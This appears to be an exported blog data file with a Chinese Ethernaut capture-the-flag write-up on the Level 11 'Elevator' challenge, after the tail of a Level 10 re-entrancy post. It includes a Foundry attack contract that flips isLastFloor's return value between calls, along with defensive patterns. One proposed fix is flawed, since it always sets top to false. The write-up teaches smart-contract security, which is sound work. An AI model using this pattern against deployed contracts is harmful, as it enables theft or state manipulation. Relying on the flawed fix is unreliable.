href=\"#其他著名案例\" class=\"headerlink\" title=\"其他著名案例\"></a>其他著名案例</h3><ol>\n<li><strong>Cream Finance</strong> (2021) - 1.3亿美元损失</li>\n<li><strong>bZx Protocol</strong> (2020) - 多次重入攻击</li>\n<li><strong>Uniswap V1</strong> (早期版本) - 理论漏洞</li>\n</ol>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p>重入攻击是智能合约安全的基石知识：</p>\n<ul>\n<li>✅ <strong>理解 CEI 模式的重要性</strong></li>\n<li>✅ <strong>掌握多种防护措施的使用</strong></li>\n<li>✅ <strong>认识状态管理的关键性</strong></li>\n<li>✅ <strong>学习历史案例的教训</strong></li>\n</ul>\n<p>重入攻击看似简单，但其变种和组合形式在现代 DeFi 协议中仍然是主要威胁。掌握其原理和防护措施是每个智能合约开发者的必修课。</p>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-09-king/\">上一关: Level 9 - King</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-11-elevator/\">下一关: Level 11 - Elevator</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n<hr>\n<p><em>安全的合约不仅要做正确的事，还要以正确的顺序做事。</em> 🔐</p>\n"},{"title":"Ethernaut Level 11: Elevator - 接口实现攻击","date":"2025-01-25T07:50:00.000Z","updated":"2025-01-25T07:50:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"深入学习智能合约接口实现攻击，掌握 Elevator 关卡的攻击技术和防护措施。理解接口定义与实现的安全风险。","_content":"\n# 🎯 Ethernaut Level 11: Elevator - 接口实现攻击\n\n> **关卡链接**: [Ethernaut Level 11 - Elevator](https://ethernaut.openzeppelin.com/level/11)  \n> **攻击类型**: 接口实现攻击  \n> **难度**: ⭐⭐⭐☆☆\n\n## 📋 挑战目标\n\n目的是使电梯达到最顶层，即使题目合约的 `top` 为 `true`。关键在于理解接口定义与实际实现的差别，以及如何利用这个差别进行攻击。\n\n![Elevator Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel11.svg)\n\n## 🔍 漏洞分析\n\n### 接口的安全风险\n\n本关卡重在考验我们对智能合约接口的认知程度：\n- **接口定义函数签名，但不定义它们的逻辑**\n- 这是一种无需知道实现细节就可以与其他合约交互的方法\n- 但也意味着攻击者可以控制接口的实现逻辑\n\n### 关键漏洞代码\n\n```solidity\nfunction goTo(uint _floor) public {\n    Building building = Building(msg.sender);\n\n    if (!building.isLastFloor(_floor)) {\n      floor = _floor;\n      top = building.isLastFloor(floor);  // 第二次调用！\n    }\n}\n```\n\n### 攻击向量\n\n在 `goTo` 函数中，`isLastFloor` 被调用两次：\n1. **第一次调用**：必须返回 `false`，否则无法进入修改 `top` 的逻辑\n2. **第二次调用**：我们可以让它返回 `true` 来设置 `top = true`\n\n我们可以通过创建一个 `isLastFloor()` 来利用这一点，它将第一次返回 `false`，第二次返回 `true`。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Ethernaut.sol\";\nimport \"../src/levels/ElevatorFactory.sol\";\n\ninterface Building {\n    function isLastFloor(uint) external returns (bool);\n}\n\ncontract ElevatorAttacker is Building {\n    Elevator instance;\n    bool top = false;\n\n    constructor(address _elevator) {\n        instance = Elevator(_elevator);\n    }\n\n    // 关键：状态变化的接口实现\n    function isLastFloor(uint _floor) external override returns (bool) {\n        top = !top;  // 第一次调用时 top 变为 true，第二次变为 false\n        return !top; // 第一次返回 false，第二次返回 true\n    }\n\n    function attack(uint _floor) public {\n        instance.goTo(_floor);\n    }\n}\n\ncontract ElevatorTest is Test {\n    Ethernaut ethernaut;\n    ElevatorFactory elevatorFactory;\n    \n    function setUp() public {\n        ethernaut = new Ethernaut();\n        elevatorFactory = new ElevatorFactory();\n        ethernaut.registerLevel(elevatorFactory);\n    }\n    \n    function testElevatorExploit() public {\n        // 创建关卡实例\n        address levelInstance = ethernaut.createLevelInstance(elevatorFactory);\n        Elevator instance = Elevator(levelInstance);\n        \n        // 检查初始状态\n        assertEq(instance.top(), false);\n        assertEq(instance.floor(), 0);\n        \n        // 部署攻击合约\n        ElevatorAttacker attacker = new ElevatorAttacker(levelInstance);\n        \n        // 执行攻击\n        attacker.attack(1);\n        \n        // 验证攻击成功\n        assertEq(instance.top(), true);\n        assertEq(instance.floor(), 1);\n        \n        // 提交关卡\n        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(\n            payable(levelInstance)\n        );\n        assert(levelSuccessfullyPassed);\n    }\n}\n```\n\n### 关键攻击步骤\n\n1. **实现 Building 接口**：创建一个合约实现 `Building` 接口\n2. **状态变化逻辑**：在 `isLastFloor()` 中实现状态变化\n3. **调用 goTo 函数**：通过攻击合约调用 `goTo()`\n4. **验证结果**：检查 `top` 是否为 `true`\n\n```solidity\n// 状态变化的关键实现\nfunction isLastFloor(uint _floor) external override returns (bool) {\n    top = !top;  // 切换状态\n    return !top; // 第一次返回 false，第二次返回 true\n}\n```\n\n## 🛡️ 防御措施\n\n### 1. 避免多次调用外部函数\n\n```solidity\n// ❌ 不安全：多次调用外部函数\ncontract VulnerableElevator {\n    function goTo(uint _floor) public {\n        Building building = Building(msg.sender);\n        \n        if (!building.isLastFloor(_floor)) {  // 第一次调用\n            floor = _floor;\n            top = building.isLastFloor(floor);  // 第二次调用！\n        }\n    }\n}\n\n// ✅ 安全：只调用一次并缓存结果\ncontract SecureElevator {\n    function goTo(uint _floor) public {\n        Building building = Building(msg.sender);\n        \n        bool isLast = building.isLastFloor(_floor);  // 只调用一次\n        \n        if (!isLast) {\n            floor = _floor;\n            top = isLast;  // 使用缓存的结果\n        }\n    }\n}\n```\n\n### 2. 使用 view 函数\n\n```solidity\n// ✅ 使用 view 函数防止状态改变\ninterface Building {\n    function isLastFloor(uint) external view returns (bool);  // view 修饰符\n}\n\ncontract SecureElevator {\n    function goTo(uint _floor) public {\n        Building building = Building(msg.sender);\n        \n        if (!building.isLastFloor(_floor)) {\n            floor = _floor;\n            top = building.isLastFloor(floor);  // view 函数保证一致性\n        }\n    }\n}\n```\n\n### 3. 使用白名单机制\n\n```solidity\ncontract SecureElevator {\n    mapping(address => bool) public approvedBuildings;\n    address public owner;\n    \n    modifier onlyApprovedBuilding() {\n        require(approvedBuildings[msg.sender], \"Unauthorized building\");\n        _;\n    }\n    \n    function addApprovedBuilding(address building) public {\n        require(msg.sender == owner);\n        approvedBuildings[building] = true;\n    }\n    \n    function goTo(uint _floor) public onlyApprovedBuilding {\n        // 安全逻辑\n    }\n}\n```\n\n### 4. 实现内部逻辑\n\n```solidity\ncontract SecureElevator {\n    uint public floor;\n    bool public top;\n    uint public topFloor = 10;  // 定义最高层\n    \n    function goTo(uint _floor) public {\n        require(_floor <= topFloor, \"Floor too high\");\n        \n        floor = _floor;\n        top = (_floor == topFloor);  // 内部判断逻辑\n    }\n}\n```\n\n## 🔧 相关工具和技术\n\n### 接口安全检测\n\n```solidity\n// 检测接口实现的一致性\ncontract InterfaceChecker {\n    function checkConsistency(address building, uint floor) public {\n        Building b = Building(building);\n        \n        // 多次调用检查一致性\n        bool result1 = b.isLastFloor(floor);\n        bool result2 = b.isLastFloor(floor);\n        \n        require(result1 == result2, \"Inconsistent interface implementation\");\n    }\n}\n```\n\n### 合约分析工具\n\n```bash\n# 使用 Slither 检测接口安全问题\nslither . --detect external-function\n\n# 使用 Mythril 分析\nMyth analyze <contract.sol> --execution-timeout 60\n```\n\n## 🎯 总结\n\n**核心概念**:\n- 接口是一种无需知道实现细节就可以与其他合约交互的方式\n- 但永远不要盲目相信它们！\n- 多次调用外部函数可能产生不一致的结果\n\n**攻击向量**:\n- 实现恶意的接口逻辑\n- 利用多次调用之间的状态变化\n- 操纵函数返回值以达到攻击目的\n\n**防御策略**:\n- 只调用一次外部函数并缓存结果\n- 使用 `view` 函数修饰符防止状态改变\n- 实现白名单机制控制访问\n- 尽可能使用内部逻辑而不依赖外部实现\n\n","source":"_posts/ethernaut-level-11-elevator.md","raw":"---\ntitle: 'Ethernaut Level 11: Elevator - 接口实现攻击'\ndate: 2025-01-25 15:50:00\nupdated: 2025-01-25 15:50:00\ncategories:\n  - Ethernaut 系列\n  - 进阶攻击篇 (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - 接口实现攻击\n  - 智能合约接口\n  - 智能合约安全\n  - Solidity\n  - 状态操纵\nseries: Ethernaut Foundry Solutions\nexcerpt: \"深入学习智能合约接口实现攻击，掌握 Elevator 关卡的攻击技术和防护措施。理解接口定义与实现的安全风险。\"\n---\n\n# 🎯 Ethernaut Level 11: Elevator - 接口实现攻击\n\n> **关卡链接**: [Ethernaut Level 11 - Elevator](https://ethernaut.openzeppelin.com/level/11)  \n> **攻击类型**: 接口实现攻击  \n> **难度**: ⭐⭐⭐☆☆\n\n## 📋 挑战目标\n\n目的是使电梯达到最顶层，即使题目合约的 `top` 为 `true`。关键在于理解接口定义与实际实现的差别，以及如何利用这个差别进行攻击。\n\n![Elevator Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel11.svg)\n\n## 🔍 漏洞分析\n\n### 接口的安全风险\n\n本关卡重在考验我们对智能合约接口的认知程度：\n- **接口定义函数签名，但不定义它们的逻辑**\n- 这是一种无需知道实现细节就可以与其他合约交互的方法\n- 但也意味着攻击者可以控制接口的实现逻辑\n\n### 关键漏洞代码\n\n```solidity\nfunction goTo(uint _floor) public {\n    Building building = Building(msg.sender);\n\n    if (!building.isLastFloor(_floor)) {\n      floor = _floor;\n      top = building.isLastFloor(floor);  // 第二次调用！\n    }\n}\n```\n\n### 攻击向量\n\n在 `goTo` 函数中，`isLastFloor` 被调用两次：\n1. **第一次调用**：必须返回 `false`，否则无法进入修改 `top` 的逻辑\n2. **第二次调用**：我们可以让它返回 `true` 来设置 `top = true`\n\n我们可以通过创建一个 `isLastFloor()` 来利用这一点，它将第一次返回 `false`，第二次返回 `true`。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Ethernaut.sol\";\nimport \"../src/levels/ElevatorFactory.sol\";\n\ninterface Building {\n    function isLastFloor(uint) external returns (bool);\n}\n\ncontract ElevatorAttacker is Building {\n    Elevator instance;\n    bool top = false;\n\n    constructor(address _elevator) {\n        instance = Elevator(_elevator);\n    }\n\n    // 关键：状态变化的接口实现\n    function isLastFloor(uint _floor) external override returns (bool) {\n        top = !top;  // 第一次调用时 top 变为 true，第二次变为 false\n        return !top; // 第一次返回 false，第二次返回 true\n    }\n\n    function attack(uint _floor) public {\n        instance.goTo(_floor);\n    }\n}\n\ncontract ElevatorTest is Test {\n    Ethernaut ethernaut;\n    ElevatorFactory elevatorFactory;\n    \n    function setUp() public {\n        ethernaut = new Ethernaut();\n        elevatorFactory = new ElevatorFactory();\n        ethernaut.registerLevel(elevatorFactory);\n    }\n    \n    function testElevatorExploit() public {\n        // 创建关卡实例\n        address levelInstance = ethernaut.createLevelInstance(elevatorFactory);\n        Elevator instance = Elevator(levelInstance);\n        \n        // 检查初始状态\n        assertEq(instance.top(), false);\n        assertEq(instance.floor(), 0);\n        \n        // 部署攻击合约\n        ElevatorAttacker attacker = new ElevatorAttacker(levelInstance);\n        \n        // 执行攻击\n        attacker.attack(1);\n        \n        // 验证攻击成功\n        assertEq(instance.top(), true);\n        assertEq(instance.floor(), 1);\n        \n        // 提交关卡\n        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(\n            payable(levelInstance)\n        );\n        assert(levelSuccessfullyPassed);\n    }\n}\n```\n\n### 关键攻击步骤\n\n1. **实现 Building 接口**：创建一个合约实现 `Building` 接口\n2. **状态变化逻辑**：在 `isLastFloor()` 中实现状态变化\n3. **调用 goTo 函数**：通过攻击合约调用 `goTo()`\n4. **验证结果**：检查 `top` 是否为 `true`\n\n```solidity\n// 状态变化的关键实现\nfunction isLastFloor(uint _floor) external override returns (bool) {\n    top = !top;  // 切换状态\n    return !top; // 第一次返回 false，第二次返回 true\n}\n```\n\n## 🛡️ 防御措施\n\n### 1. 避免多次调用外部函数\n\n```solidity\n// ❌ 不安全：多次调用外部函数\ncontract VulnerableElevator {\n    function goTo(uint _floor) public {\n        Building building = Building(msg.sender);\n        \n        if (!building.isLastFloor(_floor)) {  // 第一次调用\n            floor = _floor;\n            top = building.isLastFloor(floor);  // 第二次调用！\n        }\n    }\n}\n\n// ✅ 安全：只调用一次并缓存结果\ncontract SecureElevator {\n    function goTo(uint _floor) public {\n        Building building = Building(msg.sender);\n        \n        bool isLast = building.isLastFloor(_floor);  // 只调用一次\n        \n        if (!isLast) {\n            floor = _floor;\n            top = isLast;  // 使用缓存的结果\n        }\n    }\n}\n```\n\n### 2. 使用 view 函数\n\n```solidity\n// ✅ 使用 view 函数防止状态改变\ninterface Building {\n    function isLastFloor(uint) external view returns (bool);  // view 修饰符\n}\n\ncontract SecureElevator {\n    function goTo(uint _floor) public {\n        Building building = Building(msg.sender);\n        \n        if (!building.isLastFloor(_floor)) {\n            floor = _floor;\n            top = building.isLastFloor(floor);  // view 函数保证一致性\n        }\n    }\n}\n```\n\n### 3. 使用白名单机制\n\n```solidity\ncontract SecureElevator {\n    mapping(address => bool) public approvedBuildings;\n    address public owner;\n    \n    modifier onlyApprovedBuilding() {\n        require(approvedBuildings[msg.sender], \"Unauthorized building\");\n        _;\n    }\n    \n    function addApprovedBuilding(address building) public {\n        require(msg.sender == owner);\n        approvedBuildings[building] = true;\n    }\n    \n    function goTo(uint _floor) public onlyApprovedBuilding {\n        // 安全逻辑\n    }\n}\n```\n\n### 4. 实现内部逻辑\n\n```solidity\ncontract SecureElevator {\n    uint public floor;\n    bool public top;\n    uint public topFloor = 10;  // 定义最高层\n    \n    function goTo(uint _floor) public {\n        require(_floor <= topFloor, \"Floor too high\");\n        \n        floor = _floor;\n        top = (_floor == topFloor);  // 内部判断逻辑\n    }\n}\n```\n\n## 🔧 相关工具和技术\n\n### 接口安全检测\n\n```solidity\n// 检测接口实现的一致性\ncontract InterfaceChecker {\n    function checkConsistency(address building, uint floor) public {\n        Building b = Building(building);\n        \n        // 多次调用检查一致性\n        bool result1 = b.isLastFloor(floor);\n        bool result2 = b.isLastFloor(floor);\n        \n        require(result1 == result2, \"Inconsistent interface implementation\");\n    }\n}\n```\n\n### 合约分析工具\n\n```bash\n# 使用 Slither 检测接口安全问题\nslither . --detect external-function\n\n# 使用 Mythril 分析\nMyth analyze <contract.sol> --execution-timeout 60\n```\n\n## 🎯 总结\n\n**核心概念**:\n- 接口是一种无需知道实现细节就可以与其他合约交互的方式\n- 但永远不要盲目相信它们！\n- 多次调用外部函数可能产生不一致的结果\n\n**攻击向量**:\n- 实现恶意的接口逻辑\n- 利用多次调用之间的状态变化\n- 操纵函数返回值以达到攻击目的\n\n**防御策略**:\n- 只调用一次外部函数并缓存结果\n- 使用 `view` 函数修饰符防止状态改变\n- 实现白名单机制控制访问\n- 尽可能使用内部逻辑而不依赖外部实现\n\n","slug":"ethernaut-level-11-elevator","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpa000xbf5q70rt10n8","content":"<h1 id=\"🎯-Ethernaut-Level-11-Elevator-接口实现攻击\"><a href=\"#🎯-Ethernaut-Level-11-Elevator-接口实现攻击\" class=\"headerlink\" title=\"🎯 Ethernaut Level 11: Elevator - 接口实现攻击\"></a>🎯 Ethernaut Level 11: Elevator - 接口实现攻击</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/11\">Ethernaut Level 11 - Elevator</a><br><strong>攻击类型</strong>: 接口实现攻击<br><strong>难度</strong>: ⭐⭐⭐☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>目的是使电梯达到最顶层，即使题目合约的 <code>top</code> 为 <code>true</code>。关键在于理解接口定义与实际实现的差别，以及如何利用这个差别进行攻击。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel11.svg\" alt=\"Elevator Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"接口的安全风险\"><a href=\"#接口的安全风险\" class=\"headerlink\" title=\"接口的安全风险\"></a>接口的安全风险</h3><p>本关卡重在考验我们对智能合约接口的认知程度：</p>\n<ul>\n<li><strong>接口定义函数签名，但不定义它们的逻辑</strong></li>\n<li>这是一种无需知道实现细节就可以与其他合约交互的方法</li>\n<li>但也意味着攻击者可以控制接口的实现逻辑</li>\n</ul>\n<h3 id=\"关键漏洞代码\"><a href=\"#关键漏洞代码\" class=\"headerlink\" title=\"关键漏洞代码\"></a>关键漏洞代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function goTo(uint _floor) public &#123;</span><br><span class=\"line\">    Building building = Building(msg.sender);</span><br><span class=\"line\"></span><br><span class=\"line\">    if (!building.isLastFloor(_floor)) &#123;</span><br><span class=\"line\">      floor = _floor;</span><br><span class=\"line\">      top = building.isLastFloor(floor);  // 第二次调用！</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"攻击向量\"><a href=\"#攻击向量\" class=\"headerlink\" title=\"攻击向量\"></a>攻击向量</h3><p>在 <code>goTo</code> 函数中，<code>isLastFloor</code> 被调用两次：</p>\n<ol>\n<li><strong>第一次调用</strong>：必须返回 <code>false</code>，否则无法进入修改 <code>top</code> 的逻辑</li>\n<li><strong>第二次调用</strong>：我们可以让它返回 <code>true</code> 来设置 <code>top = true</code></li>\n</ol>\n<p>我们可以通过创建一个 <code>isLastFloor()</code> 来利用这一点，它将第一次返回 <code>false</code>，第二次返回 <code>true</code>。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class=\"line\">import &quot;../src/levels/ElevatorFactory.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">interface Building &#123;</span><br><span class=\"line\">    function isLastFloor(uint) external returns (bool);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ElevatorAttacker is Building &#123;</span><br><span class=\"line\">    Elevator instance;</span><br><span class=\"line\">    bool top = false;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _elevator) &#123;</span><br><span class=\"line\">        instance = Elevator(_elevator);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 关键：状态变化的接口实现</span><br><span class=\"line\">    function isLastFloor(uint _floor) external override returns (bool) &#123;</span><br><span class=\"line\">        top = !top;  // 第一次调用时 top 变为 true，第二次变为 false</span><br><span class=\"line\">        return !top; // 第一次返回 false，第二次返回 true</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack(uint _floor) public &#123;</span><br><span class=\"line\">        instance.goTo(_floor);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ElevatorTest is Test &#123;</span><br><span class=\"line\">    Ethernaut ethernaut;</span><br><span class=\"line\">    ElevatorFactory elevatorFactory;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        ethernaut = new Ethernaut();</span><br><span class=\"line\">        elevatorFactory = new ElevatorFactory();</span><br><span class=\"line\">        ethernaut.registerLevel(elevatorFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testElevatorExploit() public &#123;</span><br><span class=\"line\">        // 创建关卡实例</span><br><span class=\"line\">        address levelInstance = ethernaut.createLevelInstance(elevatorFactory);</span><br><span class=\"line\">        Elevator instance = Elevator(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 检查初始状态</span><br><span class=\"line\">        assertEq(instance.top(), false);</span><br><span class=\"line\">        assertEq(instance.floor(), 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署攻击合约</span><br><span class=\"line\">        ElevatorAttacker attacker = new ElevatorAttacker(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 执行攻击</span><br><span class=\"line\">        attacker.attack(1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertEq(instance.top(), true);</span><br><span class=\"line\">        assertEq(instance.floor(), 1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 提交关卡</span><br><span class=\"line\">        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(</span><br><span class=\"line\">            payable(levelInstance)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        assert(levelSuccessfullyPassed);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>实现 Building 接口</strong>：创建一个合约实现 <code>Building</code> 接口</li>\n<li><strong>状态变化逻辑</strong>：在 <code>isLastFloor()</code> 中实现状态变化</li>\n<li><strong>调用 goTo 函数</strong>：通过攻击合约调用 <code>goTo()</code></li>\n<li><strong>验证结果</strong>：检查 <code>top</code> 是否为 <code>true</code></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 状态变化的关键实现</span><br><span class=\"line\">function isLastFloor(uint _floor) external override returns (bool) &#123;</span><br><span class=\"line\">    top = !top;  // 切换状态</span><br><span class=\"line\">    return !top; // 第一次返回 false，第二次返回 true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-避免多次调用外部函数\"><a href=\"#1-避免多次调用外部函数\" class=\"headerlink\" title=\"1. 避免多次调用外部函数\"></a>1. 避免多次调用外部函数</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 不安全：多次调用外部函数</span><br><span class=\"line\">contract VulnerableElevator &#123;</span><br><span class=\"line\">    function goTo(uint _floor) public &#123;</span><br><span class=\"line\">        Building building = Building(msg.sender);</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!building.isLastFloor(_floor)) &#123;  // 第一次调用</span><br><span class=\"line\">            floor = _floor;</span><br><span class=\"line\">            top = building.isLastFloor(floor);  // 第二次调用！</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 安全：只调用一次并缓存结果</span><br><span class=\"line\">contract SecureElevator &#123;</span><br><span class=\"line\">    function goTo(uint _floor) public &#123;</span><br><span class=\"line\">        Building building = Building(msg.sender);</span><br><span class=\"line\">        </span><br><span class=\"line\">        bool isLast = building.isLastFloor(_floor);  // 只调用一次</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!isLast) &#123;</span><br><span class=\"line\">            floor = _floor;</span><br><span class=\"line\">            top = isLast;  // 使用缓存的结果</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-使用-view-函数\"><a href=\"#2-使用-view-函数\" class=\"headerlink\" title=\"2. 使用 view 函数\"></a>2. 使用 view 函数</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅ 使用 view 函数防止状态改变</span><br><span class=\"line\">interface Building &#123;</span><br><span class=\"line\">    function isLastFloor(uint) external view returns (bool);  // view 修饰符</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SecureElevator &#123;</span><br><span class=\"line\">    function goTo(uint _floor) public &#123;</span><br><span class=\"line\">        Building building = Building(msg.sender);</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!building.isLastFloor(_floor)) &#123;</span><br><span class=\"line\">            floor = _floor;</span><br><span class=\"line\">            top = building.isLastFloor(floor);  // view 函数保证一致性</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-使用白名单机制\"><a href=\"#3-使用白名单机制\" class=\"headerlink\" title=\"3. 使用白名单机制\"></a>3. 使用白名单机制</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span 